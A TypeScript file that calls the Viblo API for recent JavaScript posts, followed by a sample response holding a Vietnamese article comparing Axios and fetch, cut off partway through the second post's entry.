// import moment from "moment";
import axios from "axios";
import moment from "moment";
import { dateFormat, today } from "../lib/helpers/moment";

export const PostApi = {
  async get() {
    const posts = await axios.get(
      "https://viblo.asia/api/search/posts?q=javascript%20nodejs%20react%20typescript&s=created&o=desc"
    );

    return posts.data.data.filter((item: any) => {
      const date = moment(item.published_at, "YYYY-MM-DD HH:mm:ss");
      return date.isSame(moment(today(), dateFormat), "d");
    });
  },

  async getPostContent(slug: string) {
    const res = await axios.get("https://viblo.asia/api/p/" + slug);

    return res.data.contents;
  },
};

const response = {
  data: [
    {
      id: 51535,
      title: "T\u1ea1o sao n\u00ean d\u00f9ng Axios h\u01a1n Fetch",
      slug: "1Je5E7GjZnL",
      url: "https://viblo.asia/p/tao-sao-nen-dung-axios-hon-fetch-1Je5E7GjZnL",
      user_id: 205,
      moderation: null,
      transliterated: "tao-sao-nen-dung-axios-hon-fetch",
      contents_short:
        "Khi l\u00e0m Frontend, ch\u00fang ta lu\u00f4n ph\u1ea3i c\u00f3 y\u00eau c\u1ea7u request API, ho\u1eb7c request file t\u1eeb server, \u0111\u00e2y \u0111\u1ec1u g\u1ecdi chung l\u00e0 t\u1ea1o c\u00e1c HTTP request.\n\nC\u00f3 nhi\u1ec1u th\u01b0 vi\u1ec7n h\u1ed7 tr\u1ee3 cho vi\u1ec7c n\u00e0y, \u0111\u00f3 c\u00f3 th\u1ec3 l\u00e0 fetch() ho\u1eb7...",
      contents:
        "Khi l\u00e0m Frontend, ch\u00fang ta lu\u00f4n ph\u1ea3i c\u00f3 y\u00eau c\u1ea7u request API, ho\u1eb7c request file t\u1eeb server, \u0111\u00e2y \u0111\u1ec1u g\u1ecdi chung l\u00e0 t\u1ea1o c\u00e1c HTTP request.\n\nC\u00f3 nhi\u1ec1u th\u01b0 vi\u1ec7n h\u1ed7 tr\u1ee3 cho vi\u1ec7c n\u00e0y, \u0111\u00f3 c\u00f3 th\u1ec3 l\u00e0 `fetch()` ho\u1eb7c `axios`. Trong b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta s\u1ebd c\u00f9ng t\u00ecm hi\u1ec3u c\u00f4ng c\u1ee5 n\u00e0o h\u1ed7 tr\u1ee3 t\u1ed1t h\u01a1n trong vi\u1ec7c n\u00e0y.\n\n## T\u1ed5ng quan v\u00e0 c\u00fa ph\u00e1p \n### Fetch \n\n`fetch()` l\u00e0 m\u1ed9t h\u00e0m c\u1ee7a \u0111\u1ed1i t\u01b0\u1ee3ng `window` trong javascript, cho ph\u00e9p ch\u00fang ta l\u1ea5y d\u1eef li\u1ec7u t\u1eeb API m\u1ed9t c\u00e1ch b\u1ea5t \u0111\u1ed3ng b\u1ed9 m\u00e0 kh\u00f4ng c\u1ea7n c\u00e0i \u0111\u1eb7t th\u00eam th\u01b0 vi\u1ec7n, ngh\u0129a l\u00e0 fetch kh\u00f4ng ph\u1ea3i l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n m\u00e0 l\u00e0 c\u00f4ng c\u1ee5 c\u00f3 s\u1eb5n m\u00e0 tr\u00ecnh duy\u1ec7t cung c\u1ea5p th\u00f4ng qua Fetch API \n\nC\u00fa ph\u00e1p c\u01a1 b\u1ea3n l\u00e0 \n\n```\nfetch(url)\n  .then((res) => {\n    // handle response\n  })\n  .catch((error) => {\n    // handle error\n  });\n```\n\nTrong h\u00e0m fetch, ph\u1ea3i lu\u00f4n c\u00f3 m\u1ed9t tham s\u1ed1 b\u1eaft bu\u1ed9c, \u0111\u00f3 l\u00e0 `url`, n\u00f3 l\u00e0 \u0111\u01b0\u1eddng d\u1eabn m\u00e0 user mu\u1ed1n l\u1ea5y data. Sau \u0111\u00f3 `fetch` s\u1ebd tr\u1ea3 v\u1ec1 m\u1ed9t promise m\u00e0 c\u00f3 th\u1ec3 d\u00f9ng \u0111\u1ec3 x\u1eed l\u00fd th\u00e0nh \u0111\u1ed1i t\u01b0\u1ee3ng response hay b\u1eafn ra l\u1ed7i. \n\nVD:\n\n```\nfetch(url, {\n  method: \"POST\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n  },\n  body: JSON.stringify(data),\n})\n  .then((response) => response.json())\n  .catch((error) => console.log(error));\n```\n\nTham s\u1ed1 th\u1ee9 2 l\u00e0 options, c\u00f3 th\u1ec3 th\u00eam ho\u1eb7c kh\u00f4ng. N\u1ebfu user kh\u00f4ng th\u00eam, th\u00ec request s\u1ebd lu\u00f4n l\u00e0 method GET, n\u00f3 s\u1ebd l\u1ea5y n\u1ed9i d\u00f9ng t\u1eeb URl \u0111\u01b0\u1ee3c cung c\u1ea5p v\u00e0 sau \u0111\u00f3 promise s\u1ebd tr\u1ea3 v\u1ec1 \u0111\u1ed1i t\u01b0\u1ee3ng response, v\u00e0 user c\u1ea7n m\u1ed9t h\u00e0m kh\u00e1c \u0111\u1ec3 x\u1eed l\u00fd body response n\u00e0y th\u00e0nh \u0111\u1ecbnh d\u1ea1ng mong mu\u1ed1n. \n\nVD nh\u01b0 c\u00e1c \u0111\u1ecbnh d\u1ea1ng:\n\n```\nresponse.json() // \u0111\u00e2y l\u00e0 format ph\u1ed5 bi\u1ebfn nh\u1ea5t \nresponse.text()\nresponse.blob()\nresponse.formData()\nresponse.arrayBuffer()\n```\n\nTuy nhi\u00ean, h\u00e0m `fetch` \u0111\u01b0\u1ee3c t\u1ea1o s\u1eb5n n\u00e0y l\u1ea1i kh\u00f4ng d\u00f9ng \u0111\u01b0\u1ee3c trong Node.js, n\u1ebfu mu\u1ed1n s\u1eed d\u1ee5ng th\u00ec ta c\u1ea7n c\u00e0i th\u00eam m\u1ed9t polyfill (vd `node-fetch`), nh\u01b0ng v\u1eabn c\u00f3 m\u1ed9t v\u00e0i s\u1ef1 kh\u00e1c nhau so v\u1edbi b\u1ea3n g\u1ed1c.\n\n### Axios \n\nAxios l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n javascript \u0111\u1ec3 t\u1ea1o request HTTP \u0111\u01b0\u1ee3c d\u00f9ng cho c\u1ea3 Node, XMLHttpRequest hay tr\u00ean tr\u00ecnh duy\u1ec7t. \u0110\u00f3 l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n hi\u1ec7n \u0111\u1ea1i, d\u1ef1a tr\u00ean Promise API. \n\nAxios c\u00f3 m\u1ed9t v\u00e0i \u01b0u \u0111i\u1ec3m l\u00e0 c\u00f3 th\u1ec3 ch\u1ed1ng l\u1ea1i CSFR (cross-site request forgery)\n\n\u0110\u1ec3 s\u1eed d\u1ee5ng Axios, b\u1ea1n c\u1ea7n c\u00e0i \u0111\u1eb7t v\u00e0 import v\u00e0o project, th\u00f4ng qua CDN, npm, Yarn hay Bower.\n\nC\u00fa ph\u00e1p c\u01a1 b\u1ea3n:\n\n```\naxios.get(url)\n  .then((response) => console.log(response))\n  .catch((error) => console.log(error));\n```\n\nC\u00fa ph\u00e1p tr\u00ean l\u00e0 c\u00e1ch t\u1ecda m\u1ed9t request get \u0111\u01a1n gi\u1ea3n, c\u00f3 m\u1ed9t callback cho response ho\u1eb7c error. Khi user c\u1ea7n t\u1ea1o request ph\u1ee9c t\u1ea1p h\u01a1n, th\u00ec c\u1ea7n ph\u1ea3i t\u1ea1o m\u1ed9t \u0111\u1ed1i t\u01b0\u1ee3ng config \n\nC\u00f3 nhi\u1ec1u config, b\u1ea1n c\u00f3 th\u1ec3 xem \u1edf [\u0111\u00e2y](https://github.com/axios/axios#request-config), ph\u1ed5 bi\u1ebfn nh\u1ea5t l\u00e0 url, baseURL, params, auth, headers, responseType, v\u00e0 data.\n\nTrong response, Axios c\u0169ng tr\u1ea3 l\u1ea1i m\u1ed9t promise \u0111\u1ec3 x\u1eed l\u00fd response object hay l\u00e0 m\u1ed9t object error. Trong response object s\u1ebd ch\u1ee9a c\u00e1c gi\u00e1 tr\u1ecb :\n\n```\n- data: body c\u1ee7a response \n- status: m\u00e3 HTTP status code c\u1ee7a response, vd 200 hay 404 \n- statusText: \u0111o\u1ea1n text c\u1ee7a HTTP status\n- headers: ch\u1ee9 header c\u1ee7a request \n- config: c\u1ea5u h\u00ecnh c\u1ee7a request \n- request: \u0111\u1ed1i t\u01b0\u1ee3ng XMLHttpRequest (XHR)\n```\n\nKhi l\u00e0m vi\u1ec7c v\u1edbi `fetch()`, th\u00ec ta c\u1ea7n l\u00e0m vi\u1ec7c v\u1edbi 2 promise, v\u00e0 ta c\u00f3 th\u1ec3 tr\u00e1nh \u0111\u01b0\u1ee3c \u0111i\u1ec1u \u0111\u1ea5y v\u00e0 gi\u00fap code clean h\u01a1n khi d\u00f9ng v\u1edbi Axios \n\nC\u00f3 m\u1ed9t v\u00e0i \u0111i\u1ec3m kh\u00e1c nhau c\u01a1 b\u1ea3n c\u00f3 th\u1ec3 th\u1ea5y ngay l\u00e0:\n\n- Axios s\u1eed d\u1ee5ng thu\u1ed9c t\u00ednh `data`, nh\u01b0ng fetch th\u00ec d\u00f9ng `body` \u0111\u1ec3 ch\u1ee9a data.\n- Data c\u1ee7a axios \u0111\u00e3 t\u1ef1 \u0111\u1ed9ng convert sang json, c\u00f2n data c\u1ee7a fetch l\u00e0 \u1edf d\u1ea1ng string \n- Url trong Axios l\u00e0 \u0111\u1ed1i t\u01b0\u1ee3ng config, c\u00f2n trong fetch l\u00e0 1 tham s\u1ed1 URL v\u00e0 options \n\n## S\u1ef1 kh\u00e1c nhau gi\u1eefa Axios v\u00e0 Fetch \n\n### JSON\n\n#### Fetch \nV\u1edbi fetch, user c\u1ea7n d\u00f9ng m\u1ed9t h\u00e0m \u0111\u1ec3 convert response data, v\u00ec data \u0111\u01b0\u1ee3c nh\u1ea7n t\u1eeb response l\u00e0 d\u1ea1ng d\u1eef li\u1ec7u [Response object](https://developer.mozilla.org/en-US/docs/Web/API/Response).\n\n```\nfetch('url')\n  .then((response) => response.json())\n  .then((data) => console.log(data))\n  .catch((error) => console.log(error));\n```\n\n\u1edf trong VD tr\u00ean, user c\u1ea7n g\u1ecdi h\u00e0m `response.json()` \u0111\u1ec3 convert data response. \n\n#### Axios \n\nUser truy\u1ec1n data v\u00e0o request hay nh\u1eadn data t\u1eeb response th\u00ec data lu\u00f4n t\u1ef1 \u0111\u1ed9ng convert., do \u0111\u00f3 kh\u00f4ng c\u1ea7n ph\u1ea3i th\u00eam c\u00e1c method kh\u00e1c. \n\n```\naxios.get('url')\n    .then((response)=>console.log(response))\n    .catch((error)=>console.log(error))\n```\n\n### X\u1eed l\u00fd l\u1ed7i \n\n#### Fetch \n\nM\u1ed7i khi b\u1ea1n get data t\u1eeb response b\u1eb1ng fetch, b\u1ea1n c\u1ea7n ki\u1ec3m tra status l\u00e0 th\u00e0nh c\u00f4ng hay kh\u00f4ng, v\u00ec d\u00f9 c\u00f3 l\u1ed7i th\u00ec response v\u1eabn \u0111\u01b0\u1ee3c tr\u1ea3 v\u1ec1 \n\nTrong fetch m\u1ed9t promise s\u1ebd kh\u00f4ng \u0111\u01b0\u1ee3c x\u1eed l\u00fd n\u1ebfu v\u00e0 ch\u1ec9 n\u1ebfu request kh\u00f4ng \u0111\u01b0\u1ee3c ho\u00e0n th\u00e0nh \n\n```\nfetch('url')\n    .then((response)=>{\n        if(!response.ok){\n            throw Error (response.statusText);\n        }\n        return response.json();\n    })\n    .then((data)=>console.log(data))\n    .catch((error)=>console.log(error))\n```\n\nFetch c\u0169ng kh\u00f4ng b\u1eafn l\u1ed7i network, do \u0111\u00f3, b\u1ea1n ph\u1ea3i lu\u00f4n ki\u1ec3m tra trnajg th\u00e1i th\u00f4ng qua thu\u1ed9c t\u00ednh `response.ok`. Ch\u00fang ta c\u00f3 th\u1ec3 t\u00e1ch method ri\u00eang \u0111\u1ec3 gi\u00fap t\u00e1i s\u1eed d\u1ee5ng code.\n\n```\nconst checkError = response => {\n    if (!response.ok) throw Error(response.statusText);\n    return response.json();\n  };\n  \n  fetch(\"url\")\n    .then(checkError)\n    .then(data => console.log(data))\n    .catch(error => console.log(\"error\", error));\n```\n\n#### Axios \n\nVi\u1ec7c x\u1eed l\u00fd l\u1ed7i r\u1ea5t d\u1ec5 d\u00e0ng v\u00ec Axios cho ph\u00e9p b\u1eafn l\u1ed7i network. N\u1ebfu \u0111\u00f3 l\u00e0 m\u1ed9t bad response nh\u01b0 `404`, promise s\u1ebd \u0111\u01b0\u1ee3c b\u1ecf qua v\u00e0 s\u1ebd tr\u1ea3 v\u1ec1 m\u1ed9t error. Do \u0111\u00f3, ta c\u1ea7n `catch` error \u0111\u1ea5y. \n\n```\naxios.get('url')\n    .then((response)=> console.log(response))\n    .catch((error)=>{\n        if(error.response){\n        // When response status code is out of 2xxx range\n        console.log(error.response.data);\n        console.log(error.response.status);\n        console.log(error.response.headers);\n        } else if (error.request){\n            //When no response was received after request was made\n            console.log(error.request);\n        } else {\n            // Error\n            console.log(error.message);\n        }\n    })\n```\n\n=> Quan \u0111i\u1ec3m c\u00e1 nh\u00e2n l\u00e0 Axios gi\u00fap code t\u01b0\u1eddng minh h\u01a1n \n\n### Ti\u1ebfn tr\u00ecnh Download \n\nKhi c\u1ea7n th\u1ef1c hi\u1ec7n load file l\u1edbn, th\u00ec vi\u1ec7c hi\u1ec7n th\u1ecb c\u00e1c th\u00e0nh ph\u1ea7n th\u00f4ng b\u00e1o ti\u1ebfn tr\u00ecnh x\u1eed l\u00fd s\u1ebd gi\u00fap t\u0103ng UX h\u01a1n. V\u1edbi c\u00e1ch x\u1eed l\u00fd c\u01a1 b\u1ea3n, ta c\u00f3 th\u1ec3 d\u00f9ng `XMLHttpRequest.onprogress` nh\u01b0 m\u1ed9t callback \u0111\u1ec3 th\u00eam loading. V\u1eady v\u1edbi fetch v\u00e0 axios s\u1ebd x\u1eed l\u00fd v\u1ea5n \u0111\u1ec1 n\u00e0y nh\u01b0 th\u1ebf n\u00e0o \n\n#### Fetch \n\n\u0110\u1ec3 theo d\u00f5i ti\u1ebfn \u0111\u1ed9 t\u1ea3i, v\u1edbi fetch, b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng m\u1ed9t trong c\u00e1c thu\u1ed9c t\u00ednh c\u1ee7a response.body, \u0111\u00f3 l\u00e0 object `ReadableStream`.. N\u00f3 cung c\u1ea5p d\u1eef li\u1ec7u body t\u1eebng ph\u1ea7n m\u1ed9t v\u00e0 cho ph\u00e9p b\u1ea1n \u0111\u1ebfm bao nhi\u00eau data \u0111\u01b0\u1ee3c t\u1ea3i.\n\n```\nhttps://github.com/AnthumChris/fetch-progress-indicators\n\nconst element = document.getElementById('progress');\n\nfetch('url')\n  .then(response => {\n\n    if (!response.ok) {\n      throw Error(response.status+' '+response.statusText)\n    }\n\n    // ensure ReadableStream is supported\n    if (!response.body) {\n      throw Error('ReadableStream not yet supported in this browser.')\n    }\n\n    // store the size of the entity-body, in bytes\n    const contentLength = response.headers.get('content-length');\n\n    // ensure contentLength is available\n    if (!contentLength) {\n      throw Error('Content-Length response header unavailable');\n    }\n\n    // parse the integer into a base-10 number\n    const total = parseInt(contentLength, 10);\n\n    let loaded = 0;\n\n    return new Response(\n\n      // create and return a readable stream\n      new ReadableStream({\n        start(controller) {\n          const reader = response.body.getReader();\n\n          read();\n          function read() {\n            reader.read().then(({done, value}) => {\n              if (done) {\n                controller.close();\n                return; \n              }\n              loaded += value.byteLength;\n              progress({loaded, total})\n              controller.enqueue(value);\n              read();\n            }).catch(error => {\n              console.error(error);\n              controller.error(error)                  \n            })\n          }\n        }\n      })\n    );\n  })\n  .then(response => \n    // construct a blob from the data\n    response.blob()\n  )\n  .then(data => {\n    // insert the downloaded image into the page\n    document.getElementById('img').src = URL.createObjectURL(data);\n  })\n  .catch(error => {\n    console.error(error);\n  })\n\nfunction progress({loaded, total}) {\n  element.innerHTML = Math.round(loaded/total*100)+'%';\n}\n```\n\n\u0110o\u1ea1n code tr\u00ean s\u1eed d\u1ee5ng `ReadableStream` \u0111\u1ec3 hi\u1ec3n th\u1ecb ph\u1ea3n h\u1ed3i khi \u1ea3nh \u0111ang \u0111\u01b0\u1ee3c t\u1ea3i \n\n#### Axios \n\nV\u1edbi Axios, ch\u00fang ta c\u0169ng d\u1ec5 d\u00e0ng th\u00eam ti\u1ebfn tr\u00ecnh ho\u1ea1t \u0111\u1ed9ng, v\u00ec c\u00f3 s\u1eb5n th\u01b0 vi\u1ec7n cho vi\u1ec7c n\u00e0y, \u0111\u00f3 l\u00e0 [`Axios Progress Bar`](https://github.com/rikmms/progress-bar-4-axios/)\n\n```\nloadProgressBar();\n\nfunction downloadFile(url) {\n    axios.get(url, {responseType: 'blob'})\n      .then(response => {\n        const reader = new window.FileReader();\n        reader.readAsDataURL(response.data); \n        reader.onload = () => {\n          document.getElementById('img').setAttribute('src', reader.result);\n        }\n      })\n      .catch(error => {\n        console.log(error)\n      });\n}\n```\n\n### Ti\u1ebfn tr\u00ecnh Upload \n#### Fetch \nV\u1edbi Fetch, b\u1ea1n kh\u00f4ng th\u1ec3 theo d\u00f5i qu\u00e1 tr\u00ecnh upload file \n\n#### Axios \nAxios cho ph\u00e9p theo d\u00f5i qu\u00e1 tr\u00ecnh upload c\u1ee7a b\u1ea1n. \u0110i\u1ec1u n\u00e0y th\u1eadt tuy\u1ec7t v\u1eddi khi x\u1eed l\u00fd c\u00e1c ch\u1ee9c n\u0103ng upload video hay file n\u1eb7ng, h\u1ed7 tr\u1ee3 vi\u1ec7c c\u1ea3i thi\u1ec7n UX \n\n```\nconst config = {\n    onUploadProgress: event => console.log(event.loaded)\n  };\n\naxios.put(\"/api\", data, config);\n```\n\n### Ng\u0103n ch\u1eb7n HTTP \n\nVI\u1ec7c ng\u0103n ch\u1eb7n s\u1ebd th\u1eadt quan tr\u1ecdng khi b\u1ea1n c\u1ea7n ki\u1ec3m tra hay thay \u0111\u1ed5i request HTTp t\u1eeb \u1ee9ng d\u1ee5ng \u0111\u1ebfn server th\u00f4ng qua qu\u00e1 tr\u00ecnh x\u00e1c th\u1ef1c, log, ...\n\n#### Fetch \nFetch kh\u00f4ng cung c\u1ea5p vi\u1ec7c ng\u0103n ch\u1eb7n hay ki\u1ec3m so\u00e1t HTTP request m\u1eb7c \u0111\u1ecbnh. Ch\u00fang ta ch\u1ec9 c\u00f3 d\u00f9ng c\u00e1ch ghi \u0111\u1ec1 h\u00e0m fetch v\u00e0 \u0111\u1ecbnh ngh\u0129a c\u00e1c y\u00eau c\u1ea7u khi trong qu\u00e1 tr\u00ecnh g\u1eedi request, nh\u01b0ng \u0111i\u1ec1u n\u00e0y s\u1ebd l\u00e0m t\u0103ng s\u1ed1 l\u01b0\u1ee3ng code v\u00e0 ph\u1ee9c t\u1ea1p h\u01a1n nhi\u1ec1u so v\u1edbi Axios \n\nvd\n\n```\nfetch = (originalFetch => {\n    return (...arguments) => {\n      const result = originalFetch.apply(this, arguments);\n        return result.then(console.log('Request was sent'));\n    };\n  })(fetch);\n  \nfetch('url')\n    .then(response => response.json())\n    .then(data => {\n      console.log(data) \n    });\n```\n\n#### Axios \n\n\u0110\u00e2y l\u00e0 m\u1ed9t trong c\u00e1c ch\u1ee9c n\u0103ng ch\u00ednh c\u1ee7a th\u01b0 vi\u1ec7n n\u00e0y \n\n```\n// request interceptors\naxios.interceptors.request.use((config)=>{\n    console.log('Request was sent');\n    return config;\n})\n\n// response interceptors\naxios.interceptors.response.use((response) => {\n    // do an operation on response\n    return response; \n})\n\naxios.get('url')\n    .then((response)=>console.log(response))\n    .catch((error)=>console.log(error))\n````\n\nC\u00e1c h\u00e0m `axios.interceptors.request.use()` v\u00e0 `axios.interceptors.response.use()` cho ph\u00e9p ch\u00fang ta \u0111\u1ecbnh ngh\u0129a code tr\u01b0\u1edbc khi m\u1ed9t request HTTP \u0111\u01b0\u1ee3c g\u1eedi \n\n### Response Timeout\n#### Fetch \n\nFetch cung c\u1ea5p ch\u1ee9c n\u0103ng timout th\u00f4ng qua interface `AbortController`\n\n```\nconst controller = new AbortController();\nconst signal = controller.signal;\nconst options = {\n  method: 'POST',\n  signal: signal,\n  body: JSON.stringify({\n    firstName: 'Sabesan',\n    lastName: 'Sathananthan'\n  })\n};  \nconst promise = fetch('/login', options);\nconst timeoutId = setTimeout(() => controller.abort(), 5000);\n\npromise\n  .then(response => {/* handle the response */})\n  .catch(error => console.error('timeout exceeded'));\n```\n\n\u0110\u1ed1i t\u01b0\u1ee3ng AbortController cho ph\u00e9p b\u1ea1n d\u1eebng request. Trong vd tr\u00ean, n\u1ebfu server kh\u00f4ng ph\u1ea3n h\u1ed3i nhi\u1ec1u h\u01a1n 5 gi\u00e2y, th\u00ec qu\u00e1 tr\u00ecnh request s\u1ebd b\u1ecb d\u1eebng l\u1ea1i b\u1eb1ng c\u00e1ch g\u1ecdi h\u00e0m `controller.abort()`\n\n#### Axios \n\nCh\u00fang ta ch\u1ec9 c\u1ea7n \u0111\u01a1n gi\u1ea3n th\u00eam `timeout` v\u00e0o object config l\u00e0 \u0111\u01b0\u1ee3c\n\n```\naxios({\n    method: 'post',\n    url: '/login',\n    timeout: 5000,    // 5 seconds timeout\n    data: {\n      firstName: 'Sabesan',\n      lastName: 'Sathananthan'\n    }\n  })\n  .then(response => {/* handle the response */})\n  .catch(error => console.error('timeout exceeded'))\n```\n\n\u0110\u00e2y l\u00e0 m\u1ed9t trong c\u00e1c nguy\u00ean nh\u00e2n m\u00e0 Axios \u0111\u01b0\u1ee3c ch\u1ecdn d\u00f9ng nhi\u1ec1u h\u01a1n, do vi\u1ec7c c\u00e0i \u0111\u1eb7t timeout \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u \n\n### C\u00e1c request \u0111\u1ed3ng th\u1eddi \n#### Fetch \n\n\u0110\u1ec3 t\u1ea1o c\u00e1c request \u0111\u1ed3ng th\u1eddi, b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng h\u00e0m \u0111\u01b0\u1ee3c t\u1ea1o s\u1eb5n , \u0111\u00f3 l\u00e0 `Promise.all()`, v\u00e0 truy\u1ec1n v\u00e0o array fetch request, sau \u0111\u00f3 g\u1ecdi h\u00e0m async \u0111\u1ec3 x\u1eed l\u00fd response.\n\n```\nPromise.all([\n  fetch('https://api.github.com/users/sabesansathananthan'),\n  fetch('https://api.github.com/users/rcvaram')\n])\n.then(async([res1, res2]) => {\n  const a = await res1.json();\n  const b = await res2.json();\n  console.log(a.login + ' has ' + a.public_repos + ' public repos on GitHub');\n  console.log(b.login + ' has ' + b.public_repos + ' public repos on GitHub');\n})\n.catch(error => {\n  console.log(error);\n});\n```\n\n#### Axios \n\nAxios cung c\u1ea5p ph\u01b0\u01a1ng th\u1ee9c cho vi\u1ec7c tr\u00ean th\u00f4ng qua h\u00e0m `axios.all()`. C\u0169ng t\u01b0\u01a1ng t\u1ef1 fetch, b\u1ea1n c\u1ea7n truy\u1ec1n v\u00e0o m\u1ed9t m\u1ea3ng c\u00e1c request v\u00e0 g\u00e1n m\u1ea3ng response v\u00e0o h\u00e0m `axios.spread()`\n\n```\naxios.all([\n  axios.get('https://api.github.com/users/sabesansathananthan'), \n  axios.get('https://api.github.com/users/rcvaram')\n])\n.then(axios.spread((obj1, obj2) => {\n  // Both requests are now complete\n  console.log(obj1.data.login + ' has ' + obj1.data.public_repos + ' public repos on GitHub');\n  console.log(obj2.data.login + ' has ' + obj2.data.public_repos + ' public repos on GitHub');\n}));\n```\n\n### Kh\u1ea3 n\u0103ng t\u01b0\u01a1ng th\u00edch\n#### Fetch\n\nFetch ch\u1ec9 h\u1ed7 tr\u1ee3 t\u1eeb Chrome 42, Safari 10.1, Firefox 39 v\u00e0 Edge 14 tr\u1edf l\u00ean. \n\n\u0110\u1ec3 s\u1eed d\u1ee5ng fetch trong tr\u00ecnh duy\u1ec7t m\u00e0 kh\u00f4ng support, b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng fetch v\u1edbi m\u1ed9t polyfill nh\u01b0 `windows.fetch()`\n\n\u0110\u1ec3 s\u1eed d\u1ee5ng fetch polyfill, c\u1ea7n c\u00e0i \u0111\u1eb7t th\u00f4ng qua npm:\n\n```\nnpm install whatwg-fetch --save\n```\n\nV\u00e0 s\u1eed d\u1ee5ng \n\n```\nimport {fetch as fetchPolyfill} from 'whatwg-fetch'\n\nwindow.fetch(...)   // use native browser version\nfetchPolyfill(...)  // use polyfill implementation\n```\n\n#### Axios \n\nKh\u00f4ng gi\u1ed1ng nh\u01b0 fetch, Axios h\u1ed7 tr\u1ee3 h\u1ea7u nh\u01b0 m\u1ecdi tr\u00ecnh duy\u1ec7t v\u00e0 version, k\u1ec3 c\u1ea3 c\u00e1c tr\u00ecnh duy\u1ec7t c\u0169 nh\u01b0 IE11 c\u0169ng c\u00f3 th\u1ec3 ch\u1ea1y Axios m\u00e0 kh\u00f4ng c\u00f3 v\u1ea5n \u0111\u1ec1 g\u00ec\n\n### K\u1ebft lu\u1eadn\n\nV\u1edbi h\u1ea7u h\u1ebft c\u00e1c y\u00eau c\u1ea7u c\u1ea7n thi\u1ebft cho giao ti\u1ebfp HTTP, Axios \u0111\u1ec1u cung c\u1ea5p gi\u1ea3i ph\u00e1p d\u1ec5 d\u00e0ng cho v\u1ea5n \u0111\u1ec1 \u0111\u00f3. Th\u01b0 vi\u1ec7n n\u00e0y th\u1eadt s\u1ef1 l\u00e0 m\u1ed9t gi\u1ea3i ph\u00e1p t\u1ed1t nh\u1ea5t khi c\u1ea7n thao t\u00e1c v\u1edbi c\u00e1c request HTTP m\u00e0 c\u1ea7n c\u00f3 c\u01a1 ch\u1ebf x\u1eed l\u00fd l\u1ed7i chu\u1ea9n v\u00e0 th\u00eam c\u00e1c h\u00e0nh \u0111\u1ed9ng ng\u0103n ch\u1eb7n HTTP.\n\nTuy nhi\u00ean, v\u1edbi c\u00e1c project nh\u1ecf, ch\u1ec9 y\u00eau c\u1ea7u g\u1ecdi c\u00e1c API \u0111\u01a1n gi\u1ea3n, th\u00ec fetch c\u0169ng l\u00e0 m\u1ed9t gi\u1ea3i ph\u00e1p t\u1ed1t, v\u00ec suy cho c\u00f9ng, Axios c\u0169ng l\u00e0 1 th\u01b0 vi\u1ec7n b\u00ean th\u1ee9 3, v\u00e0 c\u1ea7n import v\u00e0o, nh\u01b0 v\u1eady s\u1ebd l\u00e0m t\u0103ng k\u00edch th\u01b0\u1edbc file JS c\u1ee7a ch\u00fang ta.",
      published_at: "2021-03-19 14:49:35",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 09:31:03",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 9,
      points: 1,
      views_count: 69,
      clips_count: 0,
      comments_count: 2,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 205,
          url: "https://viblo.asia/u/hungsonsn",
          avatar: "1a233263-2911-48d7-8a29-d23a87d91f8f.gif",
          name: "S\u01a1n L\u00e3nh H\u00f9ng",
          username: "hungsonsn",
          followers_count: 34,
          reputation: 1234,
          posts_count: 66,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "axios",
            name: "axios",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=axios&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "fetch",
            name: "Fetch",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Fetch&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 205,
            url: "https://viblo.asia/u/hungsonsn",
            avatar: "1a233263-2911-48d7-8a29-d23a87d91f8f.gif",
            name: "S\u01a1n L\u00e3nh H\u00f9ng",
            username: "hungsonsn",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 50733,
            url: "https://viblo.asia/u/khangnd",
            avatar: "57a8b9ef-f61e-4bc8-98f1-e8a29f9fb073.png",
            name: "Khang",
            username: "khangnd",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 49579,
      title: "Nguy\u00ean l\u00fd S.O.L.I.D. trong JavaScript (P4)",
      slug: "1Je5EQ715nL",
      url:
        "https://viblo.asia/p/nguyen-ly-solid-trong-javascript-p4-1Je5EQ715nL",
      user_id: 26381,
      moderation: null,
      transliterated: "nguyen-ly-solid-trong-javascript-p4",
      contents_short:
        "Hi m\u1ecdi ng\u01b0\u1eddi, trong c\u00e1c b\u00e0i vi\u1ebft tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 t\u00ecm hi\u1ec3u v\u1ec1 4 nguy\u00ean l\u00fd \u0111\u1ea7u ti\u00ean c\u1ee7a SOLID, trong b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta c\u00f9ng t\u00ecm hi\u1ec3u v\u1ec1 ch\u1eef c\u00e1i cu\u1ed1i c\u00f9ng nh\u00e9\n1. D - Dependency Inversion Princi...",
      contents:
